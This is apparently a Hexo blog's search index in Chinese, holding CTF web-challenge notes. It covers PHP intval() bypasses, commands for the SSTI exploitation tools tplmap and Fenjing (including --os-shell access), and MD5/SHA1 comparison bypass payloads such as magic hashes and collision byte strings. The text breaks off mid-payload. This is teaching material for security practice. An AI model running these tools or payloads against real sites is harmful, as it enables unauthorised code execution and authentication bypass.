<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>intval</title>
    <url>/2024/07/12/intval/</url>
    <content><![CDATA[<p>&emsp;&emsp;intval()函数用来获取变量的整数值，使用的时候常见的有两种情况：<br>&emsp;1.转换整数时，返回整数本身<br>&emsp;2.转换字符串时，会从字符串的开始进行转换，直到遇到一个非数字的字符，如果字符串的第一个字符不是整数，则返回0  </p>
<h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><p>&emsp;如果它的值为一个数组，只要数组里面有值，那么不论值的数量，返回值都为1，空数组则返回0  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$b</span>[]=1;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="built_in">echo</span> intval(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;输出</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Array1</span><br></pre></td></tr></table></figure>

<h3 id="字符串绕过"><a href="#字符串绕过" class="headerlink" title="字符串绕过"></a>字符串绕过</h3><p>&emsp;&emsp;类似于’1000’,’2 or id &#x3D; 1000’的这种带单引号或者有字符的类型，intval()函数会从字符串的开始进行转换，直到遇到非数字的字符，例如第二个转换到or的时候，由于or不是数字类型的字符，从而停止转换，转换的结果就只有2。  </p>
<h3 id="字符串类型-进制绕过"><a href="#字符串类型-进制绕过" class="headerlink" title="字符串类型&amp;进制绕过"></a>字符串类型&amp;进制绕过</h3><p><img data-src="/images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%B1%BB%E5%9E%8B&%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87.png" alt="字符串类型&amp;进制绕过"></p>
]]></content>
      <categories>
        <category>绕过</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>tplmap</title>
    <url>/2024/06/06/tplmap/</url>
    <content><![CDATA[<h2 id="tplmap-py"><a href="#tplmap-py" class="headerlink" title="tplmap.py"></a>tplmap.py</h2><h3 id="tplmap介绍"><a href="#tplmap介绍" class="headerlink" title="tplmap介绍"></a>tplmap介绍</h3><p>&emsp;&emsp;Tplmap是一个python工具，可以通过使用沙箱转义技术找到代码注入和服务器端模板注入（SSTI）漏洞。该工具能够在许多模板引擎中利用SSTI来访问目标文件或操作系统。一些受支持的模板引擎包括PHP（代码评估），Ruby（代码评估），JaveScript（代码评估），Python（代码评估），ERB，Jinja2和Tornado。该工具可以执行对这些模板引擎的盲注入，并具有执行远程命令的能力。（说的高级吧，其实选用其他博主的(●’◡’●)）实用指数⭐⭐⭐</p>
<h3 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h3><p>&emsp;&emsp;在kali或者linux安装即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/epinna/tplmap</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;进入该文件夹下安装依赖（就是安装库啦）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> tplmap</span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;如果安装报错了，不妨试一试pip2安装，别问我怎么知道的，我就是(ᇂ_ᇂ|||)</p>
<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GET:</span><br><span class="line">python3 tplmap.py -u &lt;URL:&gt;?name=</span><br><span class="line">POST:</span><br><span class="line">python3 tplmap.py -u &lt;URL:&gt; --data= name=</span><br></pre></td></tr></table></figure>

<p><img data-src="/images/tplmap.png" alt="tplmap"></p>
<p>&emsp;&emsp;如上面所示，可以得出模板是jinja2，如果下面那一段显示yes或者ok，那么可以直接用shell指令（–os-shell）。</p>
<p>&emsp;&emsp;更多用法可以用help查看，很多python脚本都可以这样做(不认识英文直接去找翻译(ง •̀_•́)ง加油)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 tplmap.py --<span class="built_in">help</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>工具|脚本 利用</category>
      </categories>
      <tags>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>fenjing</title>
    <url>/2024/06/05/fenjing/</url>
    <content><![CDATA[<h2 id="Fenjing-焚靖"><a href="#Fenjing-焚靖" class="headerlink" title="Fenjing(焚靖)"></a>Fenjing(焚靖)</h2><h3 id="fenjing介绍"><a href="#fenjing介绍" class="headerlink" title="fenjing介绍"></a>fenjing介绍</h3><p>&emsp;&emsp;焚靖是一个针对CTF比赛中Jinja2 SSTI绕过WAF的全自动脚本，可以自动攻击给定的网站或接口。能解决常规性的SSTI题目，实用指数⭐⭐⭐</p>
<h3 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h3><p>&emsp;&emsp;在windows环境下安装最方便，本人尝试在kali安装失败了很多次，各种报错，最后放弃了。&emsp;(；′⌒&#96;)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install fenjing -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>

<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m fenjing scan --url &lt;URL:&gt;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;该命令执行完毕后会反弹一个shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m fenjing webui</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;会在本地弹出一个可视化操作页面，然后在根据要求填充和执行（方便新手去使用）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m fenjing crack --url &lt;URL:&gt; --method GET(POST) --inputs name(user)</span><br></pre></td></tr></table></figure>

<p> &emsp;&emsp;一把梭（说实话还是上面两个命令好用些(／_＼)大怨种）</p>
<p> &emsp;更为详细的在 <a href="https://gitcode.com/Marven11/Fenjing">here</a></p>
]]></content>
      <categories>
        <category>工具|脚本 利用</category>
      </categories>
      <tags>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>md5</title>
    <url>/2024/06/11/md5/</url>
    <content><![CDATA[<p>&emsp;&emsp;MD5绕过是web入门掌握的最基本的知识点，绕过的方法有以下几种</p>
<h3 id="常规的0e绕过"><a href="#常规的0e绕过" class="headerlink" title="常规的0e绕过"></a>常规的0e绕过</h3><p>&emsp;&emsp;在遇到php弱比较两者MD5时，往往使用0e绕过，其原理是利用弱比较（&#x3D;&#x3D;）不对比数据类型，相当于对比第一个数，例如</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">(md5(<span class="variable">$a</span>)</span></span>==<span class="built_in">md5</span>(<span class="variable">$b</span>))</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;要想满足条件，只需要两位的MD5中16位和32位的第一个满足条件就行，下列是一些达到要求的数值</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"><span class="number">240610708</span></span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;一般做这种题都是用这些数值的，直接选两个复制上去就可以了ƪ(˘⌣˘)ʃ优雅</p>
<h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><p>&emsp;&emsp;在执行md5()函数时，若参数为数组，返回结果是为null，利用这一点，可以使两者都为数组时，结果为null，以达成类型和数据都相等。例如</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">var_dump(<span class="name">md5</span>($_GET[&#x27;a&#x27;]) == md5($_GET[&#x27;b&#x27;]))</span><br><span class="line">if (<span class="name">md5</span>($_GET[&#x27;a&#x27;]) === md5($_GET[&#x27;b&#x27;]))</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;像是这种的，我们就可以利用数组进行绕过（strpos函数也是这样的，我就不单独提出来了，遇到strpos想到数组绕过就行了）</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">a</span><span class="selector-attr">[]</span>=a&amp;<span class="selector-tag">b</span><span class="selector-attr">[]</span>=<span class="selector-tag">b</span> </span><br></pre></td></tr></table></figure>

<h3 id="强类型绕过"><a href="#强类型绕过" class="headerlink" title="强类型绕过"></a>强类型绕过</h3><p>&emsp;&emsp;当判断条件或者让你所输入的参数转换成立string类型的，那么上面的方法都不能用了，例如</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>((<span class="built_in">string</span>)$_POST[<span class="string">&#x27;a&#x27;</span>] !== (<span class="built_in">string</span>)$_POST[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5($_POST[<span class="string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="string">&#x27;b&#x27;</span>]))</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;那么有没有应对之法，当然是有的，payload直接给你啦٩(๑•̀ω•́๑)۶</p>
<figure class="highlight wren"><table><tr><td class="code"><pre><span class="line">$<span class="title class_">Param</span>1<span class="operator">=</span><span class="string">&quot;\x4d\xc9<span class="char escape_">\x68</span>\xff\x0e\xe3\x5c<span class="char escape_">\x20</span><span class="char escape_">\x95</span><span class="char escape_">\x72</span>\xd4<span class="char escape_">\x77</span>\x7b<span class="char escape_">\x72</span><span class="char escape_">\x15</span><span class="char escape_">\x87</span>\xd3\x6f\xa7\xb2\x1b\xdc<span class="char escape_">\x56</span>\xb7\x4a\x3d\xc0<span class="char escape_">\x78</span>\x3e\x7b<span class="char escape_">\x95</span><span class="char escape_">\x18</span>\xaf\xbf\xa2<span class="char escape_">\x00</span>\xa8<span class="char escape_">\x28</span>\x4b\xf3\x6e\x8e\x4b<span class="char escape_">\x55</span>\xb3\x5f<span class="char escape_">\x42</span><span class="char escape_">\x75</span><span class="char escape_">\x93</span>\xd8<span class="char escape_">\x49</span><span class="char escape_">\x67</span>\x6d\xa0\xd1<span class="char escape_">\x55</span>\x5d<span class="char escape_">\x83</span><span class="char escape_">\x60</span>\xfb\x5f<span class="char escape_">\x07</span>\xfe\xa2&quot;</span>;</span><br><span class="line">$<span class="title class_">Param</span>2<span class="operator">=</span><span class="string">&quot;\x4d\xc9<span class="char escape_">\x68</span>\xff\x0e\xe3\x5c<span class="char escape_">\x20</span><span class="char escape_">\x95</span><span class="char escape_">\x72</span>\xd4<span class="char escape_">\x77</span>\x7b<span class="char escape_">\x72</span><span class="char escape_">\x15</span><span class="char escape_">\x87</span>\xd3\x6f\xa7\xb2\x1b\xdc<span class="char escape_">\x56</span>\xb7\x4a\x3d\xc0<span class="char escape_">\x78</span>\x3e\x7b<span class="char escape_">\x95</span><span class="char escape_">\x18</span>\xaf\xbf\xa2<span class="char escape_">\x02</span>\xa8<span class="char escape_">\x28</span>\x4b\xf3\x6e\x8e\x4b<span class="char escape_">\x55</span>\xb3\x5f<span class="char escape_">\x42</span><span class="char escape_">\x75</span><span class="char escape_">\x93</span>\xd8<span class="char escape_">\x49</span><span class="char escape_">\x67</span>\x6d\xa0\xd1\xd5\x5d<span class="char escape_">\x83</span><span class="char escape_">\x60</span>\xfb\x5f<span class="char escape_">\x07</span>\xfe\xa2&quot;</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight wren"><table><tr><td class="code"><pre><span class="line">$<span class="variable">data1</span><span class="operator">=</span><span class="string">&quot;\xd1<span class="char escape_">\x31</span>\xdd<span class="char escape_">\x02</span>\xc5\xe6\xee\xc4<span class="char escape_">\x69</span>\x3d\x9a<span class="char escape_">\x06</span><span class="char escape_">\x98</span>\xaf\xf9\x5c\x2f\xca\xb5<span class="char escape_">\x07</span><span class="char escape_">\x12</span><span class="char escape_">\x46</span>\x7e\xab<span class="char escape_">\x40</span><span class="char escape_">\x04</span><span class="char escape_">\x58</span>\x3e\xb8\xfb\x7f<span class="char escape_">\x89</span><span class="char escape_">\x55</span>\xad<span class="char escape_">\x34</span><span class="char escape_">\x06</span><span class="char escape_">\x09</span>\xf4\xb3<span class="char escape_">\x02</span><span class="char escape_">\x83</span>\xe4<span class="char escape_">\x88</span><span class="char escape_">\x83</span><span class="char escape_">\x25</span>\xf1<span class="char escape_">\x41</span>\x5a<span class="char escape_">\x08</span><span class="char escape_">\x51</span><span class="char escape_">\x25</span>\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd<span class="char escape_">\x72</span><span class="char escape_">\x80</span><span class="char escape_">\x37</span>\x3c\x5b\xd8<span class="char escape_">\x82</span>\x3e<span class="char escape_">\x31</span><span class="char escape_">\x56</span><span class="char escape_">\x34</span>\x8f\x5b\xae\x6d\xac\xd4<span class="char escape_">\x36</span>\xc9<span class="char escape_">\x19</span>\xc6\xdd<span class="char escape_">\x53</span>\xe2<span class="char escape_">\x34</span><span class="char escape_">\x87</span>\xda<span class="char escape_">\x03</span>\xfd<span class="char escape_">\x02</span><span class="char escape_">\x39</span><span class="char escape_">\x63</span><span class="char escape_">\x06</span>\xd2<span class="char escape_">\x48</span>\xcd\xa0\xe9\x9f<span class="char escape_">\x33</span><span class="char escape_">\x42</span>\x0f<span class="char escape_">\x57</span>\x7e\xe8\xce<span class="char escape_">\x54</span>\xb6<span class="char escape_">\x70</span><span class="char escape_">\x80</span><span class="char escape_">\x28</span>\x0d\x1e\xc6<span class="char escape_">\x98</span><span class="char escape_">\x21</span>\xbc\xb6\xa8<span class="char escape_">\x83</span><span class="char escape_">\x93</span><span class="char escape_">\x96</span>\xf9<span class="char escape_">\x65</span>\xab\x6f\xf7\x2a<span class="char escape_">\x70</span>&quot;</span>;</span><br><span class="line">$<span class="variable">data2</span><span class="operator">=</span><span class="string">&quot;\xd1<span class="char escape_">\x31</span>\xdd<span class="char escape_">\x02</span>\xc5\xe6\xee\xc4<span class="char escape_">\x69</span>\x3d\x9a<span class="char escape_">\x06</span><span class="char escape_">\x98</span>\xaf\xf9\x5c\x2f\xca\xb5<span class="char escape_">\x87</span><span class="char escape_">\x12</span><span class="char escape_">\x46</span>\x7e\xab<span class="char escape_">\x40</span><span class="char escape_">\x04</span><span class="char escape_">\x58</span>\x3e\xb8\xfb\x7f<span class="char escape_">\x89</span><span class="char escape_">\x55</span>\xad<span class="char escape_">\x34</span><span class="char escape_">\x06</span><span class="char escape_">\x09</span>\xf4\xb3<span class="char escape_">\x02</span><span class="char escape_">\x83</span>\xe4<span class="char escape_">\x88</span><span class="char escape_">\x83</span><span class="char escape_">\x25</span><span class="char escape_">\x71</span><span class="char escape_">\x41</span>\x5a<span class="char escape_">\x08</span><span class="char escape_">\x51</span><span class="char escape_">\x25</span>\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\xf2<span class="char escape_">\x80</span><span class="char escape_">\x37</span>\x3c\x5b\xd8<span class="char escape_">\x82</span>\x3e<span class="char escape_">\x31</span><span class="char escape_">\x56</span><span class="char escape_">\x34</span>\x8f\x5b\xae\x6d\xac\xd4<span class="char escape_">\x36</span>\xc9<span class="char escape_">\x19</span>\xc6\xdd<span class="char escape_">\x53</span>\xe2\xb4<span class="char escape_">\x87</span>\xda<span class="char escape_">\x03</span>\xfd<span class="char escape_">\x02</span><span class="char escape_">\x39</span><span class="char escape_">\x63</span><span class="char escape_">\x06</span>\xd2<span class="char escape_">\x48</span>\xcd\xa0\xe9\x9f<span class="char escape_">\x33</span><span class="char escape_">\x42</span>\x0f<span class="char escape_">\x57</span>\x7e\xe8\xce<span class="char escape_">\x54</span>\xb6<span class="char escape_">\x70</span><span class="char escape_">\x80</span>\xa8\x0d\x1e\xc6<span class="char escape_">\x98</span><span class="char escape_">\x21</span>\xbc\xb6\xa8<span class="char escape_">\x83</span><span class="char escape_">\x93</span><span class="char escape_">\x96</span>\xf9<span class="char escape_">\x65</span>\x2b\x6f\xf7\x2a<span class="char escape_">\x70</span>&quot;</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">array<span class="number">1</span><span class="operator">=</span>M<span class="variable">%C9h</span><span class="variable">%FF</span><span class="variable">%0</span>E<span class="variable">%E3</span><span class="variable">%5</span>C<span class="variable">%20</span><span class="variable">%95</span>r<span class="variable">%D4w</span><span class="variable">%7</span>Br<span class="variable">%15</span><span class="variable">%87</span><span class="variable">%D3o</span><span class="variable">%A7</span><span class="variable">%B2</span><span class="variable">%1</span>B<span class="variable">%DCV</span><span class="variable">%B7J</span><span class="variable">%3</span>D<span class="variable">%C0x</span><span class="variable">%3</span>E<span class="variable">%7</span>B<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%AF</span><span class="variable">%BF</span><span class="variable">%A2</span><span class="variable">%00</span><span class="variable">%A8</span><span class="variable">%28</span>K<span class="variable">%F3n</span><span class="variable">%8</span>EKU<span class="variable">%B3_Bu</span><span class="variable">%93</span><span class="variable">%D8Igm</span><span class="variable">%A0</span><span class="variable">%D1U</span><span class="variable">%5</span>D<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%FB_</span><span class="variable">%07</span><span class="variable">%FE</span><span class="variable">%A2</span>&amp;</span><br><span class="line">array<span class="number">2</span><span class="operator">=</span>M<span class="variable">%C9h</span><span class="variable">%FF</span><span class="variable">%0</span>E<span class="variable">%E3</span><span class="variable">%5</span>C<span class="variable">%20</span><span class="variable">%95</span>r<span class="variable">%D4w</span><span class="variable">%7</span>Br<span class="variable">%15</span><span class="variable">%87</span><span class="variable">%D3o</span><span class="variable">%A7</span><span class="variable">%B2</span><span class="variable">%1</span>B<span class="variable">%DCV</span><span class="variable">%B7J</span><span class="variable">%3</span>D<span class="variable">%C0x</span><span class="variable">%3</span>E<span class="variable">%7</span>B<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%AF</span><span class="variable">%BF</span><span class="variable">%A2</span><span class="variable">%02</span><span class="variable">%A8</span><span class="variable">%28</span>K<span class="variable">%F3n</span><span class="variable">%8</span>EKU<span class="variable">%B3_Bu</span><span class="variable">%93</span><span class="variable">%D8Igm</span><span class="variable">%A0</span><span class="variable">%D1</span><span class="variable">%D5</span><span class="variable">%5</span>D<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%FB_</span><span class="variable">%07</span><span class="variable">%FE</span><span class="variable">%A2</span></span><br><span class="line"></span><br><span class="line">array<span class="number">1</span><span class="operator">=</span><span class="variable">%4</span>d<span class="variable">%c9</span><span class="variable">%68</span><span class="variable">%ff</span><span class="variable">%0</span>e<span class="variable">%e3</span><span class="variable">%5</span><span class="keyword">c</span><span class="variable">%20</span><span class="variable">%95</span><span class="variable">%72</span><span class="variable">%d4</span><span class="variable">%77</span><span class="variable">%7</span>b<span class="variable">%72</span><span class="variable">%15</span><span class="variable">%87</span><span class="variable">%d3</span><span class="variable">%6</span>f<span class="variable">%a7</span><span class="variable">%b2</span><span class="variable">%1</span>b<span class="variable">%dc</span><span class="variable">%56</span><span class="variable">%b7</span><span class="variable">%4</span>a<span class="variable">%3</span>d<span class="variable">%c0</span><span class="variable">%78</span><span class="variable">%3</span>e<span class="variable">%7</span>b<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%af</span><span class="variable">%bf</span><span class="variable">%a2</span><span class="variable">%00</span><span class="variable">%a8</span><span class="variable">%28</span><span class="variable">%4</span>b<span class="variable">%f3</span><span class="variable">%6</span>e<span class="variable">%8</span>e<span class="variable">%4</span>b<span class="variable">%55</span><span class="variable">%b3</span><span class="variable">%5</span>f<span class="variable">%42</span><span class="variable">%75</span><span class="variable">%93</span><span class="variable">%d8</span><span class="variable">%49</span><span class="variable">%67</span><span class="variable">%6</span>d<span class="variable">%a0</span><span class="variable">%d1</span><span class="variable">%55</span><span class="variable">%5</span>d<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%fb</span><span class="variable">%5</span>f<span class="variable">%07</span><span class="variable">%fe</span><span class="variable">%a2</span>&amp;</span><br><span class="line">array<span class="number">2</span><span class="operator">=</span><span class="variable">%4</span>d<span class="variable">%c9</span><span class="variable">%68</span><span class="variable">%ff</span><span class="variable">%0</span>e<span class="variable">%e3</span><span class="variable">%5</span><span class="keyword">c</span><span class="variable">%20</span><span class="variable">%95</span><span class="variable">%72</span><span class="variable">%d4</span><span class="variable">%77</span><span class="variable">%7</span>b<span class="variable">%72</span><span class="variable">%15</span><span class="variable">%87</span><span class="variable">%d3</span><span class="variable">%6</span>f<span class="variable">%a7</span><span class="variable">%b2</span><span class="variable">%1</span>b<span class="variable">%dc</span><span class="variable">%56</span><span class="variable">%b7</span><span class="variable">%4</span>a<span class="variable">%3</span>d<span class="variable">%c0</span><span class="variable">%78</span><span class="variable">%3</span>e<span class="variable">%7</span>b<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%af</span><span class="variable">%bf</span><span class="variable">%a2</span><span class="variable">%02</span><span class="variable">%a8</span><span class="variable">%28</span><span class="variable">%4</span>b<span class="variable">%f3</span><span class="variable">%6</span>e<span class="variable">%8</span>e<span class="variable">%4</span>b<span class="variable">%55</span><span class="variable">%b3</span><span class="variable">%5</span>f<span class="variable">%42</span><span class="variable">%75</span><span class="variable">%93</span><span class="variable">%d8</span><span class="variable">%49</span><span class="variable">%67</span><span class="variable">%6</span>d<span class="variable">%a0</span><span class="variable">%d1</span><span class="variable">%d5</span><span class="variable">%5</span>d<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%fb</span><span class="variable">%5</span>f<span class="variable">%07</span><span class="variable">%fe</span><span class="variable">%a2</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;喜欢哪个用哪个（我个人常用第三个）</p>
<h3 id="弱比较等于自身"><a href="#弱比较等于自身" class="headerlink" title="弱比较等于自身"></a>弱比较等于自身</h3><p>&emsp;&emsp;有这么两个字符串，它的弱比较等于自身，我们称它们为奇妙的字符串，当遇到这种情况时，我们通常使用它们</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>==<span class="built_in">md5</span>(<span class="variable">$a</span>)</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;它们就是</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">Ffifdyop</span><br><span class="line"><span class="number">0e215962017</span></span><br></pre></td></tr></table></figure>

<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>&emsp;&emsp;对于需要两个内容不同但是MD5值相同的文件，使用Fastcoll工具就可以了<a href="https://blog.csdn.net/m0_73683234/article/details/137245586">Fastcoll</a></p>
<h3 id="sha1绕过"><a href="#sha1绕过" class="headerlink" title="sha1绕过"></a>sha1绕过</h3><p>&emsp;&emsp;和md5()函数是一样的原理，就弱比较的字符串和遇到string的情况不一样罢了，这里一次性放出来</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line"><span class="number">10932435112</span>: <span class="number">0</span>e0776691500413317634705586<span class="number">5026311692244</span></span><br><span class="line">aaroZmOk: <span class="number">0</span>e66507019969427134894567494<span class="number">305185566735</span></span><br><span class="line">aaK1STfY: <span class="number">0</span>e766585266557562076882711596<span class="number">24026011393</span></span><br><span class="line">aaO8zKZF: <span class="number">0</span>e89257456677279068558073954<span class="number">252716165668</span></span><br><span class="line">aa3OFF9m: <span class="number">0</span>e369777862785179849592603940<span class="number">24281014729</span></span><br><span class="line"><span class="number">0</span>e<span class="number">1290633704</span>: <span class="number">0</span>e19985187802402577070739524<span class="number">195726831799</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;遇到string的情况</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">array<span class="number">1</span><span class="operator">=</span><span class="variable">%25</span>PDF<span class="number">-1.3</span><span class="variable">%0</span>A<span class="variable">%25</span><span class="variable">%E2</span><span class="variable">%E3</span><span class="variable">%CF</span><span class="variable">%D3</span><span class="variable">%0</span>A<span class="variable">%0</span>A<span class="variable">%0</span>A<span class="number">1</span><span class="variable">%200</span><span class="variable">%20</span>obj<span class="variable">%0</span>A<span class="variable">%3</span>C<span class="variable">%3</span>C/Width<span class="variable">%202</span><span class="variable">%200</span><span class="variable">%20</span>R/Height<span class="variable">%203</span><span class="variable">%200</span><span class="variable">%20</span>R/Type<span class="variable">%204</span><span class="variable">%200</span><span class="variable">%20</span>R/Subtype<span class="variable">%205</span><span class="variable">%200</span><span class="variable">%20</span>R/Filter<span class="variable">%206</span><span class="variable">%200</span><span class="variable">%20</span>R/ColorSpace<span class="variable">%207</span><span class="variable">%200</span><span class="variable">%20</span>R/Length<span class="variable">%208</span><span class="variable">%200</span><span class="variable">%20</span>R/BitsPerComponent<span class="variable">%208</span><span class="variable">%3</span>E<span class="variable">%3</span>E<span class="variable">%0</span>Astream<span class="variable">%0</span>A<span class="variable">%FF</span><span class="variable">%D8</span><span class="variable">%FF</span><span class="variable">%FE</span><span class="variable">%00</span><span class="variable">%24</span>SHA<span class="number">-1</span><span class="variable">%20</span>is<span class="variable">%20</span>dead<span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%85</span>/<span class="variable">%EC</span><span class="variable">%09</span><span class="variable">%239</span>u<span class="variable">%9</span>C<span class="number">9</span><span class="variable">%B1</span><span class="variable">%A1</span><span class="variable">%C6</span><span class="variable">%3</span>CL<span class="variable">%97</span><span class="variable">%E1</span><span class="variable">%FF</span><span class="variable">%FE</span><span class="variable">%01</span><span class="variable">%7</span>FF<span class="variable">%DC</span><span class="variable">%93</span><span class="variable">%A6</span><span class="variable">%B6</span><span class="variable">%7</span>E<span class="variable">%01</span><span class="variable">%3</span>B<span class="variable">%02</span><span class="variable">%9</span>A<span class="variable">%AA</span><span class="variable">%1</span>D<span class="variable">%B2V</span><span class="variable">%0</span>BE<span class="variable">%CAg</span><span class="variable">%D6</span><span class="variable">%88</span><span class="variable">%C7</span><span class="variable">%F8K</span><span class="variable">%8</span>CLy<span class="variable">%1</span>F<span class="variable">%E0</span><span class="variable">%2</span>B<span class="variable">%3</span>D<span class="variable">%F6</span><span class="variable">%14</span><span class="variable">%F8m</span><span class="variable">%B1i</span><span class="variable">%09</span><span class="variable">%01</span><span class="variable">%C5kE</span><span class="variable">%C1S</span><span class="variable">%0</span>A<span class="variable">%FE</span><span class="variable">%DF</span><span class="variable">%B7</span><span class="variable">%608</span><span class="variable">%E9rr</span>/<span class="variable">%E7</span><span class="variable">%ADr</span><span class="variable">%8</span>F<span class="variable">%0</span>EI<span class="variable">%04</span><span class="variable">%E0F</span><span class="variable">%C20W</span><span class="variable">%0</span>F<span class="variable">%E9</span><span class="variable">%D4</span><span class="variable">%13</span><span class="variable">%98</span><span class="variable">%AB</span><span class="variable">%E1.</span><span class="variable">%F5</span><span class="variable">%BC</span><span class="variable">%94</span><span class="variable">%2</span>B<span class="variable">%E35B</span><span class="variable">%A4</span><span class="variable">%80</span>-<span class="variable">%98</span><span class="variable">%B5</span><span class="variable">%D7</span><span class="variable">%0</span>F<span class="variable">%2</span>A<span class="number">3</span>.<span class="variable">%C3</span><span class="variable">%7</span>F<span class="variable">%AC5</span><span class="variable">%14</span><span class="variable">%E7M</span><span class="variable">%DC</span><span class="variable">%0</span>F<span class="variable">%2</span>C<span class="variable">%C1</span><span class="variable">%A8t</span><span class="variable">%CD</span><span class="variable">%0</span>Cx<span class="number">0</span>Z<span class="variable">%21</span>Vda<span class="number">0</span><span class="variable">%97</span><span class="variable">%89</span><span class="variable">%60</span>k<span class="variable">%D0</span><span class="variable">%BF</span><span class="variable">%3</span>F<span class="variable">%98</span><span class="variable">%CD</span><span class="variable">%A8</span><span class="variable">%04</span>F<span class="variable">%29</span><span class="variable">%A1</span></span><br><span class="line"></span><br><span class="line">array<span class="number">2</span><span class="operator">=</span><span class="variable">%25</span>PDF<span class="number">-1.3</span><span class="variable">%0</span>A<span class="variable">%25</span><span class="variable">%E2</span><span class="variable">%E3</span><span class="variable">%CF</span><span class="variable">%D3</span><span class="variable">%0</span>A<span class="variable">%0</span>A<span class="variable">%0</span>A<span class="number">1</span><span class="variable">%200</span><span class="variable">%20</span>obj<span class="variable">%0</span>A<span class="variable">%3</span>C<span class="variable">%3</span>C/Width<span class="variable">%202</span><span class="variable">%200</span><span class="variable">%20</span>R/Height<span class="variable">%203</span><span class="variable">%200</span><span class="variable">%20</span>R/Type<span class="variable">%204</span><span class="variable">%200</span><span class="variable">%20</span>R/Subtype<span class="variable">%205</span><span class="variable">%200</span><span class="variable">%20</span>R/Filter<span class="variable">%206</span><span class="variable">%200</span><span class="variable">%20</span>R/ColorSpace<span class="variable">%207</span><span class="variable">%200</span><span class="variable">%20</span>R/Length<span class="variable">%208</span><span class="variable">%200</span><span class="variable">%20</span>R/BitsPerComponent<span class="variable">%208</span><span class="variable">%3</span>E<span class="variable">%3</span>E<span class="variable">%0</span>Astream<span class="variable">%0</span>A<span class="variable">%FF</span><span class="variable">%D8</span><span class="variable">%FF</span><span class="variable">%FE</span><span class="variable">%00</span><span class="variable">%24</span>SHA<span class="number">-1</span><span class="variable">%20</span>is<span class="variable">%20</span>dead<span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%85</span>/<span class="variable">%EC</span><span class="variable">%09</span><span class="variable">%239</span>u<span class="variable">%9</span>C<span class="number">9</span><span class="variable">%B1</span><span class="variable">%A1</span><span class="variable">%C6</span><span class="variable">%3</span>CL<span class="variable">%97</span><span class="variable">%E1</span><span class="variable">%FF</span><span 